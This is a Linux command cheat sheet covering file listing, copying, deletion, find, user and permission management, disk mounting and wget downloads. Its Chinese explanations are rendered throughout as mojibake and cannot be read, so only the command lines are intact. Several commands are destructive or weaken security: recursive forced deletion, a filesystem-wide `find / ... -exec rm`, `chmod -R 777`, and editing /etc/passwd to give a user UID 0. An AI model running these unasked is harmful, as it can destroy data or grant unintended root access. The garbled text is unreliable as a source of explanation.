  - `ls -a -R`ï¼Œæ˜¾ç¤ºå‡ºç›®å½•ä¸‹ä»¥åŠå…¶æ‰€æœ‰å­ç›®å½•çš„æ–‡ä»¶ / æ–‡ä»¶å¤¹ï¼ˆé€’å½’åœ°æ–¹å¼ï¼Œæ˜¾ç¤ºéšè—çš„æ–‡ä»¶ï¼‰
  - `ls -al`ï¼Œåˆ—å‡ºç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…å«éšè—ï¼‰çš„æƒé™ã€æ‰€æœ‰è€…ã€æ–‡ä»¶å¤§å°ã€ä¿®æ”¹æ—¶é—´åŠåç§°ï¼ˆä¹Ÿå°±æ˜¯æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼‰
  - `ls -ld ç›®å½•å`ï¼Œæ˜¾ç¤ºè¯¥ç›®å½•çš„åŸºæœ¬ä¿¡æ¯
  - `ls -t`ï¼Œä¾ç…§æ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´çš„é¡ºåºåˆ—å‡ºæ–‡ä»¶åã€‚
  - `ls -F`ï¼Œåˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ååŠå…¶ç±»å‹ã€‚ä»¥ **/** ç»“å°¾è¡¨ç¤ºä¸ºç›®å½•åï¼Œä»¥ ***** ç»“å°¾è¡¨ç¤ºä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»¥ **@** ç»“å°¾è¡¨ç¤ºä¸ºç¬¦å·è¿æ¥
  - `ls -lg`ï¼ŒåŒä¸Šï¼Œå¹¶æ˜¾ç¤ºå‡ºæ–‡ä»¶çš„æ‰€æœ‰è€…å·¥ä½œç»„åã€‚
  - `ls -lh`ï¼ŒæŸ¥çœ‹æ–‡ä»¶å¤¹ç±»æ–‡ä»¶è¯¦ç»†ä¿¡æ¯ï¼Œæ–‡ä»¶å¤§å°ï¼Œæ–‡ä»¶ä¿®æ”¹æ—¶é—´
  - `ls /opt | head -5`ï¼Œæ˜¾ç¤º opt ç›®å½•ä¸‹å‰ 5 æ¡è®°å½•
  - `ls -l | grep '.jar'`ï¼ŒæŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰ jar æ–‡ä»¶
  - `ls -l /opt |grep "^-"|wc -l`ï¼Œç»Ÿè®¡ opt ç›®å½•ä¸‹æ–‡ä»¶çš„ä¸ªæ•°ï¼Œä¸ä¼šé€’å½’ç»Ÿè®¡
  - `ls -lR /opt |grep "^-"|wc -l`ï¼Œç»Ÿè®¡ opt ç›®å½•ä¸‹æ–‡ä»¶çš„ä¸ªæ•°ï¼Œä¼šé€’å½’ç»Ÿè®¡
  - `ls -l /opt |grep "^d"|wc -l`ï¼Œç»Ÿè®¡ opt ç›®å½•ä¸‹ç›®å½•çš„ä¸ªæ•°ï¼Œä¸ä¼šé€’å½’ç»Ÿè®¡
  - `ls -lR /opt |grep "^d"|wc -l`ï¼Œç»Ÿè®¡ opt ç›®å½•ä¸‹ç›®å½•çš„ä¸ªæ•°ï¼Œä¼šé€’å½’ç»Ÿè®¡
  - `ls -lR /opt |grep "js"|wc -l`ï¼Œç»Ÿè®¡ opt ç›®å½•ä¸‹ js æ–‡ä»¶çš„ä¸ªæ•°ï¼Œä¼šé€’å½’ç»Ÿè®¡
  - `ls -l`ï¼Œåˆ—å‡ºç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„æƒé™ã€æ‰€æœ‰è€…ã€æ–‡ä»¶å¤§å°ã€ä¿®æ”¹æ—¶é—´åŠåç§°ï¼ˆä¹Ÿå°±æ˜¯æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼Œä¸æ˜¾ç¤ºéšè—æ–‡ä»¶ï¼‰ã€‚æ˜¾ç¤ºå‡ºæ¥çš„æ•ˆæœå¦‚ä¸‹ï¼š

```
-rwxr-xr-x. 1 root root 4096 3æœˆ 26 10:57ï¼Œå…¶ä¸­æœ€å‰é¢çš„ - è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶
lrwxrwxrwx. 1 root root 4096 3æœˆ 26 10:57ï¼Œå…¶ä¸­æœ€å‰é¢çš„ l è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªé“¾æ¥æ–‡ä»¶ï¼Œç±»ä¼¼ Windows çš„å¿«æ·æ–¹å¼
drwxr-xr-x. 5 root root 4096 3æœˆ 26 10:57ï¼Œå…¶ä¸­æœ€å‰é¢çš„ d è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªç›®å½•
```

- ```
  cd
  ```

  ï¼Œç›®å½•åˆ‡æ¢

  - `cd ..`ï¼Œæ”¹å˜ç›®å½•ä½ç½®è‡³å½“å‰ç›®å½•çš„çˆ¶ç›®å½•(ä¸Šçº§ç›®å½•)ã€‚
  - `cd ~`ï¼Œæ”¹å˜ç›®å½•ä½ç½®è‡³ç”¨æˆ·ç™»å½•æ—¶çš„å·¥ä½œç›®å½•ã€‚
  - `cd å›è½¦`ï¼Œå›åˆ°å®¶ç›®å½•
  - `cd -`ï¼Œä¸Šä¸€ä¸ªå·¥ä½œç›®å½•
  - `cd dir1/`ï¼Œæ”¹å˜ç›®å½•ä½ç½®è‡³ dir1 ç›®å½•ä¸‹ã€‚
  - `cd ~user`ï¼Œæ”¹å˜ç›®å½•ä½ç½®è‡³ç”¨æˆ·çš„å·¥ä½œç›®å½•ã€‚
  - `cd ../user`ï¼Œæ”¹å˜ç›®å½•ä½ç½®è‡³ç›¸å¯¹è·¯å¾„userçš„ç›®å½•ä¸‹ã€‚
  - `cd /../..`ï¼Œæ”¹å˜ç›®å½•ä½ç½®è‡³ç»å¯¹è·¯å¾„çš„ç›®å½•ä½ç½®ä¸‹ã€‚

- ```
  cp æºæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶
  ```

  ï¼Œå¤åˆ¶æ–‡ä»¶

  - `cp -r æºæ–‡ä»¶å¤¹ ç›®æ ‡æ–‡ä»¶å¤¹`ï¼Œå¤åˆ¶æ–‡ä»¶å¤¹
  - `cp -r -v æºæ–‡ä»¶å¤¹ ç›®æ ‡æ–‡ä»¶å¤¹`ï¼Œå¤åˆ¶æ–‡ä»¶å¤¹(æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼Œä¸€èˆ¬ç”¨äºæ–‡ä»¶å¤¹å¾ˆå¤§ï¼Œéœ€è¦æŸ¥çœ‹å¤åˆ¶è¿›åº¦çš„æ—¶å€™)
  - `cp /usr/share/easy-rsa/2.0/keys/{ca.crt,server.{crt,key},dh2048.pem,ta.key} /etc/openvpn/keys/`ï¼Œå¤åˆ¶åŒç›®å½•ä¸‹èŠ±æ‹¬å·ä¸­çš„æ–‡ä»¶

- `tar cpf - . | tar xpf - -C /opt`ï¼Œå¤åˆ¶å½“å‰æ‰€æœ‰æ–‡ä»¶åˆ° /opt ç›®å½•ä¸‹ï¼Œä¸€èˆ¬å¦‚æœæ–‡ä»¶å¤¹æ–‡ä»¶å¤šçš„æƒ…å†µä¸‹ç”¨è¿™ä¸ªæ›´å¥½ï¼Œç”¨ cp æ¯”è¾ƒå®¹æ˜“å‡ºé—®é¢˜

- ```
  mv æ–‡ä»¶ ç›®æ ‡æ–‡ä»¶å¤¹
  ```

  ï¼Œç§»åŠ¨æ–‡ä»¶åˆ°ç›®æ ‡æ–‡ä»¶å¤¹

  - `mv æ–‡ä»¶`ï¼Œä¸æŒ‡å®šç›®å½•é‡å‘½ååçš„åå­—ï¼Œç”¨æ¥é‡å‘½åæ–‡ä»¶

- `touch æ–‡ä»¶å`ï¼Œåˆ›å»ºä¸€ä¸ªç©ºç™½æ–‡ä»¶/æ›´æ–°å·²æœ‰æ–‡ä»¶çš„æ—¶é—´(åè€…å°‘ç”¨)

- `mkdir æ–‡ä»¶å¤¹å`ï¼Œåˆ›å»ºæ–‡ä»¶å¤¹

- `mkdir -p /opt/setups/nginx/conf/`ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º conf æ–‡ä»¶å¤¹ï¼Œå¦‚æœå®ƒçš„ä¸Šçº§ç›®å½• nginx æ²¡æœ‰ä¹Ÿä¼šè·Ÿç€ä¸€èµ·ç”Ÿæˆï¼Œå¦‚æœæœ‰åˆ™è·³è¿‡

- `rmdir æ–‡ä»¶å¤¹å`ï¼Œåˆ é™¤æ–‡ä»¶å¤¹(åªèƒ½åˆ é™¤æ–‡ä»¶å¤¹é‡Œé¢æ˜¯æ²¡æœ‰ä¸œè¥¿çš„æ–‡ä»¶å¤¹)

- ```
  rm æ–‡ä»¶
  ```

  ï¼Œåˆ é™¤æ–‡ä»¶

  - `rm -r æ–‡ä»¶å¤¹`ï¼Œåˆ é™¤æ–‡ä»¶å¤¹
  - `rm -r -i æ–‡ä»¶å¤¹`ï¼Œåœ¨åˆ é™¤æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶ä¼šæç¤º(è¦çš„è¯,åœ¨æç¤ºåé¢è¾“å…¥yes)
  - `rm -r -f æ–‡ä»¶å¤¹`ï¼Œå¼ºåˆ¶åˆ é™¤
  - `rm -r -f æ–‡ä»¶å¤¹1/ æ–‡ä»¶å¤¹2/ æ–‡ä»¶å¤¹3/`åˆ é™¤å¤šä¸ª

- ```
  find
  ```

  ï¼Œé«˜çº§æŸ¥æ‰¾

  - `find . -name *lin*`ï¼Œå…¶ä¸­ . ä»£è¡¨åœ¨å½“å‰ç›®å½•æ‰¾ï¼Œ-name è¡¨ç¤ºåŒ¹é…æ–‡ä»¶å / æ–‡ä»¶å¤¹åï¼Œ*lin* ç”¨é€šé…ç¬¦æœç´¢å«æœ‰linçš„æ–‡ä»¶æˆ–æ˜¯æ–‡ä»¶å¤¹
  - `find . -iname *lin*`ï¼Œå…¶ä¸­ . ä»£è¡¨åœ¨å½“å‰ç›®å½•æ‰¾ï¼Œ-iname è¡¨ç¤ºåŒ¹é…æ–‡ä»¶å / æ–‡ä»¶å¤¹åï¼ˆå¿½ç•¥å¤§å°å†™å·®å¼‚ï¼‰ï¼Œ*lin* ç”¨é€šé…ç¬¦æœç´¢å«æœ‰linçš„æ–‡ä»¶æˆ–æ˜¯æ–‡ä»¶å¤¹
  - `find / -name *.conf`ï¼Œå…¶ä¸­ / ä»£è¡¨æ ¹ç›®å½•æŸ¥æ‰¾ï¼Œ*.confä»£è¡¨æœç´¢åç¼€ä¼š.confçš„æ–‡ä»¶
  - `find /opt -name .oh-my-zsh`ï¼Œå…¶ä¸­ /opt ä»£è¡¨ç›®å½•åï¼Œ.oh-my-zsh ä»£è¡¨æœç´¢çš„æ˜¯éšè—æ–‡ä»¶ / æ–‡ä»¶å¤¹åå­—ä¸º oh-my-zsh çš„
  - `find /opt -type f -iname .oh-my-zsh`ï¼Œå…¶ä¸­ /opt ä»£è¡¨ç›®å½•åï¼Œ-type f ä»£è¡¨åªæ‰¾æ–‡ä»¶ï¼Œ.oh-my-zsh ä»£è¡¨æœç´¢çš„æ˜¯éšè—æ–‡ä»¶åå­—ä¸º oh-my-zsh çš„
  - `find /opt -type d -iname .oh-my-zsh`ï¼Œå…¶ä¸­ /opt ä»£è¡¨ç›®å½•åï¼Œ-type d ä»£è¡¨åªæ‰¾ç›®å½•ï¼Œ.oh-my-zsh ä»£è¡¨æœç´¢çš„æ˜¯éšè—æ–‡ä»¶å¤¹åå­—ä¸º oh-my-zsh çš„
  - `find . -name "lin*" -exec ls -l {} \;`ï¼Œå½“å‰ç›®å½•æœç´¢linå¼€å¤´çš„æ–‡ä»¶ï¼Œç„¶åç”¨å…¶æœç´¢åçš„ç»“æœé›†ï¼Œå†æ‰§è¡Œls -lçš„å‘½ä»¤ï¼ˆè¿™ä¸ªå‘½ä»¤å¯å˜ï¼Œå…¶ä»–å‘½ä»¤ä¹Ÿå¯ä»¥ï¼‰ï¼Œå…¶ä¸­ -exec å’Œ {} ; éƒ½æ˜¯å›ºå®šæ ¼å¼
  - `find /opt -type f -size +800M -print0 | xargs -0 du -h | sort -nr`ï¼Œæ‰¾å‡º /opt ç›®å½•ä¸‹å¤§äº 800 M çš„æ–‡ä»¶
  - `find / -name "*tower*" -exec rm {} \;`ï¼Œæ‰¾åˆ°æ–‡ä»¶å¹¶åˆ é™¤
  - `find / -name "*tower*" -exec mv {} /opt \;`ï¼Œæ‰¾åˆ°æ–‡ä»¶å¹¶ç§»åˆ° opt ç›®å½•
  - `find . -name "*" |xargs grep "youmeek"`ï¼Œé€’å½’æŸ¥æ‰¾å½“å‰æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶å†…å®¹ä¸­åŒ…å« youmeek çš„æ–‡ä»¶
  - `find . -size 0 | xargs rm -f &`ï¼Œåˆ é™¤å½“å‰ç›®å½•ä¸‹æ–‡ä»¶å¤§å°ä¸º0çš„æ–‡ä»¶
  - `du -hm --max-depth=2 | sort -nr | head -12`ï¼Œæ‰¾å‡ºç³»ç»Ÿä¸­å ç”¨å®¹é‡æœ€å¤§çš„å‰ 12 ä¸ªç›®å½•

- `cat /etc/resolv.conf`ï¼ŒæŸ¥çœ‹ DNS è®¾ç½®

- `netstat -tlunp`ï¼ŒæŸ¥çœ‹å½“å‰è¿è¡Œçš„æœåŠ¡ï¼ŒåŒæ—¶å¯ä»¥æŸ¥çœ‹åˆ°ï¼šè¿è¡Œçš„ç¨‹åºå·²ä½¿ç”¨ç«¯å£æƒ…å†µ

- `env`ï¼ŒæŸ¥çœ‹æ‰€æœ‰ç³»ç»Ÿå˜é‡

- `export`ï¼ŒæŸ¥çœ‹æ‰€æœ‰ç³»ç»Ÿå˜é‡

- ```
  echo
  ```

  - `echo $JAVA_HOME`ï¼ŒæŸ¥çœ‹æŒ‡å®šç³»ç»Ÿå˜é‡çš„å€¼ï¼Œè¿™é‡ŒæŸ¥çœ‹çš„æ˜¯è‡ªå·±é…ç½®çš„ JAVA_HOMEã€‚
  - `echo "å­—ç¬¦ä¸²å†…å®¹"`ï¼Œè¾“å‡º "å­—ç¬¦ä¸²å†…å®¹"
  - `echo > aa.txt`ï¼Œæ¸…ç©º aa.txt æ–‡ä»¶å†…å®¹ï¼ˆç±»ä¼¼çš„è¿˜æœ‰ï¼š`: > aa.txt`ï¼Œå…¶ä¸­ : æ˜¯ä¸€ä¸ªå ä½ç¬¦, ä¸äº§ç”Ÿä»»ä½•è¾“å‡ºï¼‰

- `unset $JAVA_HOME`ï¼Œåˆ é™¤æŒ‡å®šçš„ç¯å¢ƒå˜é‡

- `ln -s /opt/data /opt/logs/data`ï¼Œè¡¨ç¤ºç»™ /opt/logs ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º data çš„è½¯é“¾æ¥ï¼Œè¯¥è½¯é“¾æ¥æŒ‡å‘åˆ° /opt/data

- ```
  grep
  ```

  - `shell grep -H 'å®‰è£…' *.sh`ï¼ŒæŸ¥æ‰¾å½“å‰ç›®å½•ä¸‹æ‰€æœ‰ sh ç±»å‹æ–‡ä»¶ä¸­ï¼Œæ–‡ä»¶å†…å®¹åŒ…å« `å®‰è£…` çš„å½“å‰è¡Œå†…å®¹
  - `grep 'test' java*`ï¼Œæ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹æ‰€æœ‰ä»¥ java å¼€å¤´çš„æ–‡ä»¶ä¸­åŒ…å« test çš„è¡Œ
  - `grep 'test' spring.ini docker.sh`ï¼Œæ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹ spring.ini docker.sh ä¸¤ä¸ªæ–‡ä»¶ä¸­åŒ¹é… test çš„è¡Œ

- ```
  ps
  ```

  - `ps â€“ef|grep java`ï¼ŒæŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸­æœ‰å…³ java çš„æ‰€æœ‰è¿›ç¨‹
  - `ps -ef|grep --color java`ï¼Œé«˜äº®æ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸­æœ‰å…³ java çš„æ‰€æœ‰è¿›ç¨‹

- ```
  kill
  ```

  - `kill 1234`ï¼Œç»“æŸ pid ä¸º 1234 çš„è¿›ç¨‹
  - `kill -9 1234`ï¼Œå¼ºåˆ¶ç»“æŸ pid ä¸º 1234 çš„è¿›ç¨‹ï¼ˆæ…é‡ï¼‰
  - `killall java`ï¼Œç»“æŸåŒä¸€è¿›ç¨‹ç»„å†…çš„æ‰€æœ‰ä¸º java è¿›ç¨‹
  - `ps -ef|grep hadoop|grep -v grep|cut -c 9-15|xargs kill -9`ï¼Œç»“æŸåŒ…å«å…³é”®å­— hadoop çš„æ‰€æœ‰è¿›ç¨‹

- ```
  head
  ```

  - `head -n 10 spring.ini`ï¼ŒæŸ¥çœ‹å½“å‰æ–‡ä»¶çš„å‰ 10 è¡Œå†…å®¹

- ```
  tail
  ```

  - `tail -n 10 spring.ini`ï¼ŒæŸ¥çœ‹å½“å‰æ–‡ä»¶çš„å 10 è¡Œå†…å®¹
  - `tail -200f æ–‡ä»¶å`ï¼ŒæŸ¥çœ‹æ–‡ä»¶è¢«æ›´æ–°çš„æ–°å†…å®¹å°¾ 200 è¡Œï¼Œå¦‚æœæ–‡ä»¶è¿˜æœ‰åœ¨æ–°å¢å¯ä»¥åŠ¨æ€æŸ¥çœ‹åˆ°ï¼ˆä¸€èˆ¬ç”¨äºæŸ¥çœ‹æ—¥è®°æ–‡ä»¶ï¼‰

## ç”¨æˆ·ã€æƒé™-ç›¸å…³å‘½ä»¤

- ä½¿ç”¨ pem è¯ä¹¦ç™»å½•ï¼š

  ```
  ssh -i /opt/mykey.pem root@192.168.0.70
  ```

  - è¯ä¹¦æƒé™ä¸èƒ½å¤ªå¤§ï¼Œä¸ç„¶æ— æ³•ä½¿ç”¨ï¼š`chmod 600 mykey.pem`

- `hostname`ï¼ŒæŸ¥çœ‹å½“å‰ç™»é™†ç”¨æˆ·å…¨å

- `cat /etc/group`ï¼ŒæŸ¥çœ‹æ‰€æœ‰ç»„

- `cat /etc/passwd`ï¼ŒæŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·

- `groups youmeek`ï¼ŒæŸ¥çœ‹ youmeek ç”¨æˆ·å±äºå“ªä¸ªç»„

- `useradd youmeek -g judasn`ï¼Œæ·»åŠ ç”¨æˆ·å¹¶ç»‘å®šåˆ° judasn ç»„ä¸‹

- ```
  userdel -r youmeek
  ```

  ï¼Œåˆ é™¤åå­—ä¸º youmeek çš„ç”¨æˆ·

  - å‚æ•°ï¼š`-r`ï¼Œè¡¨ç¤ºåˆ é™¤ç”¨æˆ·çš„æ—¶å€™è¿åŒç”¨æˆ·çš„å®¶ç›®å½•ä¸€èµ·åˆ é™¤

- ä¿®æ”¹æ™®é€šç”¨æˆ· youmeek çš„æƒé™è·Ÿ root æƒé™ä¸€æ ·ï¼š

  - å¸¸ç”¨æ–¹æ³•ï¼ˆåŸç†æ˜¯æŠŠè¯¥ç”¨æˆ·åŠ åˆ°å¯ä»¥ç›´æ¥ä½¿ç”¨ sudo çš„ä¸€ä¸ªæƒé™çŠ¶æ€è€Œå·²ï¼‰ï¼š

    - ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š`vim /etc/sudoers`
    - æ‰¾åˆ° 98 è¡Œï¼ˆé¢„ä¼°ï¼‰ï¼Œæœ‰ä¸€ä¸ªï¼š`root ALL=(ALL) ALL`ï¼Œåœ¨è¿™ä¸€è¡Œä¸‹é¢å†å¢åŠ ä¸€è¡Œï¼Œæ•ˆæœå¦‚ä¸‹ï¼š

    ```
     root    ALL=(ALL)   ALL
     youmeek    ALL=(ALL)   ALL
    ```

  - å¦ä¸€ç§æ–¹æ³•ï¼š

    - ç¼–è¾‘ç³»ç»Ÿç”¨æˆ·çš„é…ç½®æ–‡ä»¶ï¼š`vim /etc/passwd`ï¼Œæ‰¾åˆ° **root** å’Œ **youmeek** å„è‡ªå¼€å¤´çš„é‚£ä¸€è¡Œï¼Œæ¯”å¦‚ root æ˜¯ï¼š`root:x:0:0:root:/root:/bin/zsh`ï¼Œè¿™ä¸ªä»£è¡¨çš„å«ä¹‰ä¸ºï¼š*ç”¨æˆ·å:å¯†ç :UserId:GroupId:æè¿°:å®¶ç›®å½•:ç™»å½•ä½¿ç”¨çš„ shell*
    - é€šè¿‡è¿™ä¸¤è¡Œå¯¹æ¯”ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¿®æ”¹ youmeek æ‰€åœ¨è¡Œçš„ UserId å€¼ å’Œ GroupId å€¼ï¼Œéƒ½æ”¹ä¸º 0ã€‚

- `groupadd judasn`ï¼Œæ·»åŠ ä¸€ä¸ªåä¸º judasn çš„ç”¨æˆ·ç»„

- `groupdel judasn`ï¼Œåˆ é™¤ä¸€ä¸ªåä¸º judasn çš„ç”¨æˆ·ç»„ï¼ˆå‰æï¼šå…ˆåˆ é™¤ç»„ä¸‹é¢çš„æ‰€æœ‰ç”¨æˆ·ï¼‰

- `usermod ç”¨æˆ·å -g ç»„å`ï¼ŒæŠŠç”¨æˆ·ä¿®æ”¹åˆ°å…¶ä»–ç»„ä¸‹

- `passwd youmeek`ï¼Œä¿®æ”¹ youmeek ç”¨æˆ·çš„å¯†ç ï¼ˆå‰æï¼šåªæœ‰ root ç”¨æˆ·æ‰æœ‰ä¿®æ”¹å…¶ä»–ç”¨æˆ·çš„æƒé™ï¼Œå…¶ä»–ç”¨æˆ·åªèƒ½ä¿®æ”¹è‡ªå·±çš„ï¼‰

- ```
  chmod 777 æ–‡ä»¶å/ç›®å½•
  ```

  ï¼Œç»™æŒ‡å®šæ–‡ä»¶å¢åŠ æœ€é«˜æƒé™ï¼Œç³»ç»Ÿä¸­çš„æ‰€æœ‰äººéƒ½å¯ä»¥è¿›è¡Œè¯»å†™ã€‚

  - linux çš„æƒé™åˆ†ä¸º rwxã€‚r ä»£è¡¨ï¼šå¯è¯»ï¼Œw ä»£è¡¨ï¼šå¯å†™ï¼Œx ä»£è¡¨ï¼šå¯æ‰§è¡Œ
  - è¿™ä¸‰ä¸ªæƒé™éƒ½å¯ä»¥è½¬æ¢æˆæ•°å€¼è¡¨ç¤ºï¼Œr = 4ï¼Œw = 2ï¼Œx = 1ï¼Œ- = 0ï¼Œæ‰€ä»¥æ€»å’Œæ˜¯ 7ï¼Œä¹Ÿå°±æ˜¯æœ€å¤§æƒé™ã€‚ç¬¬ä¸€ä¸ª 7 æ˜¯æ‰€å±ä¸»ï¼ˆuserï¼‰çš„æƒé™ï¼Œç¬¬äºŒä¸ª 7 æ˜¯æ‰€å±ç»„ï¼ˆgroupï¼‰çš„æƒé™ï¼Œæœ€åä¸€ä½ 7 æ˜¯éæœ¬ç¾¤ç»„ç”¨æˆ·ï¼ˆothersï¼‰çš„æƒé™ã€‚
  - `chmod -R 777 ç›®å½•` è¡¨ç¤ºé€’å½’ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¤¹ï¼Œéƒ½èµ‹äºˆ 777 æƒé™
  - `chown myUsername:myGroupName myFile` è¡¨ç¤ºä¿®æ”¹æ–‡ä»¶æ‰€å±ç”¨æˆ·ã€ç»„
  - `chown -R myUsername:myGroupName myFolder` è¡¨ç¤ºé€’å½’ä¿®æ”¹æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æƒé™

- ```
  su
  ```

  ï¼šåˆ‡æ¢åˆ° root ç”¨æˆ·ï¼Œç»ˆç«¯ç›®å½•è¿˜æ˜¯åŸæ¥çš„åœ°æ–¹ï¼ˆå¸¸ç”¨ï¼‰

  - `su -`ï¼šåˆ‡æ¢åˆ° root ç”¨æˆ·ï¼Œå…¶ä¸­ **-** å·å¦èµ·ä¸€ä¸ªç»ˆç«¯å¹¶åˆ‡æ¢è´¦å·
  - `su ç”¨æˆ·å`ï¼Œåˆ‡æ¢æŒ‡å®šç”¨æˆ·å¸å·ç™»é™†ï¼Œç»ˆç«¯ç›®å½•è¿˜æ˜¯åŸæ¥åœ°æ–¹ã€‚
  - `su - ç”¨æˆ·å`ï¼Œåˆ‡æ¢åˆ°æŒ‡å®šç”¨æˆ·å¸å·ç™»é™†ï¼Œå…¶ä¸­ **-** å·å¦èµ·ä¸€ä¸ªç»ˆç«¯å¹¶åˆ‡æ¢è´¦å·

- `exit`ï¼Œæ³¨é”€å½“å‰ç”¨æˆ·ï¼ˆå¸¸ç”¨ï¼‰

- `sudo æŸä¸ªå‘½ä»¤`ï¼Œä½¿ç”¨ç®¡ç†å‘˜æƒé™ä½¿ç”¨å‘½ä»¤ï¼Œä½¿ç”¨ sudo å›è½¦ä¹‹åéœ€è¦è¾“å…¥å½“å‰ç™»å½•è´¦å·çš„å¯†ç ã€‚ï¼ˆå¸¸ç”¨ï¼‰

- `passwd`ï¼Œä¿®æ”¹å½“å‰ç”¨æˆ·å¯†ç ï¼ˆå¸¸ç”¨ï¼‰

- æ·»åŠ ä¸´æ—¶è´¦å·ï¼Œå¹¶æŒ‡å®šç”¨æˆ·æ ¹ç›®å½•ï¼Œå¹¶åªæœ‰å¯è¯»æƒé™æ–¹æ³•

  - æ·»åŠ è´¦å·å¹¶æŒ‡å®šæ ¹ç›®å½•ï¼ˆç”¨æˆ·å tempuserï¼‰ï¼š`useradd -d /data/logs -m tempuser`
  - è®¾ç½®å¯†ç ï¼š`passwd tempuser` å›è½¦è®¾ç½®å¯†ç 
  - åˆ é™¤ç”¨æˆ·ï¼ˆè¯¥ç”¨æˆ·å¿…é¡»é€€å‡º SSH æ‰èƒ½åˆ é™¤æˆåŠŸï¼‰ï¼Œä¹Ÿä¼šåŒæ—¶åˆ é™¤ç»„ï¼š`userdel tempuser`

## ç£ç›˜ç®¡ç†

- ```
  df -h
  ```

  ï¼Œè‡ªåŠ¨ä»¥åˆé€‚çš„ç£ç›˜å®¹é‡å•ä½æŸ¥çœ‹ç£ç›˜å¤§å°å’Œä½¿ç”¨ç©ºé—´

  - `df -k`ï¼Œä»¥ç£ç›˜å®¹é‡å•ä½ K ä¸ºæ•°å€¼ç»“æœæŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ
  - `df -m`ï¼Œä»¥ç£ç›˜å®¹é‡å•ä½ M ä¸ºæ•°å€¼ç»“æœæŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ

- `du -sh /opt`ï¼ŒæŸ¥çœ‹ opt è¿™ä¸ªæ–‡ä»¶å¤¹å¤§å° ï¼ˆh çš„æ„æ€ human-readable ç”¨äººç±»å¯è¯»æ€§è¾ƒå¥½æ–¹å¼æ˜¾ç¤ºï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒèŠ‚å•ä½ï¼Œæ˜¾ç¤ºåˆé€‚å¤§å°çš„å•ä½ï¼‰

- `du -sh ./*`ï¼ŒæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶å¤¹å¤§å° ï¼ˆh çš„æ„æ€ human-readable ç”¨äººç±»å¯è¯»æ€§è¾ƒå¥½æ–¹å¼æ˜¾ç¤ºï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è°ƒèŠ‚å•ä½ï¼Œæ˜¾ç¤ºåˆé€‚å¤§å°çš„å•ä½ï¼‰

- `du -sh /opt/setups/`ï¼Œæ˜¾ç¤º /opt/setups/ ç›®å½•æ‰€å ç¡¬ç›˜ç©ºé—´å¤§å°ï¼ˆs è¡¨ç¤º â€“summarize ä»…æ˜¾ç¤ºæ€»è®¡ï¼Œå³å½“å‰ç›®å½•çš„å¤§å°ã€‚h è¡¨ç¤º â€“human-readable ä»¥ KBï¼ŒMBï¼ŒGB ä¸ºå•ä½ï¼Œæé«˜ä¿¡æ¯çš„å¯è¯»æ€§ï¼‰

- ```
  mount /dev/sdb5 /newDir/
  ```

  ï¼ŒæŠŠåˆ†åŒº sdb5 æŒ‚è½½åœ¨æ ¹ç›®å½•ä¸‹çš„ä¸€ä¸ªåä¸º newDir çš„ç©ºç›®å½•ä¸‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼šè¿™ä¸ªç›®å½•æœ€å¥½ä¸ºç©ºï¼Œä¸ç„¶å·²æœ‰çš„é‚£äº›æ–‡ä»¶å°†çœ‹ä¸åˆ°ï¼Œé™¤éå¸è½½æŒ‚è½½ã€‚

  - æŒ‚è½½å¥½ä¹‹åï¼Œé€šè¿‡ï¼š`df -h`ï¼ŒæŸ¥çœ‹æŒ‚è½½æƒ…å†µã€‚

- ```
  umount /newDir/
  ```

  ï¼Œå¸è½½æŒ‚è½½ï¼Œç”¨ç›®å½•å

  - å¦‚æœè¿™æ ·å¸è½½ä¸äº†å¯ä»¥ä½¿ç”¨ï¼š`umount -l /newDir/`

- `umount /dev/sdb5`ï¼Œå¸è½½æŒ‚è½½ï¼Œç”¨åˆ†åŒºå

## wget ä¸‹è½½æ–‡ä»¶

- å¸¸è§„ä¸‹è½½ï¼š`wget http://www.gitnavi.com/index.html`
- è‡ªåŠ¨æ–­ç‚¹ä¸‹è½½ï¼š`wget -c http://www.gitnavi.com/index.html`
- åå°ä¸‹è½½ï¼š`wget -b http://www.gitnavi.com/index.html`
- ä¼ªè£…ä»£ç†åç§°ä¸‹è½½ï¼š`wget --user-agent="Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16" http://www.gitnavi.com/index.html`
- é™é€Ÿä¸‹è½½ï¼š`wget --limit-rate=300k http://www.gitnavi.com/index.html`
- æ‰¹é‡ä¸‹è½½ï¼š`wget -i /opt/download.txt`ï¼Œä¸€ä¸ªä¸‹è½½åœ°å€ä¸€è¡Œ
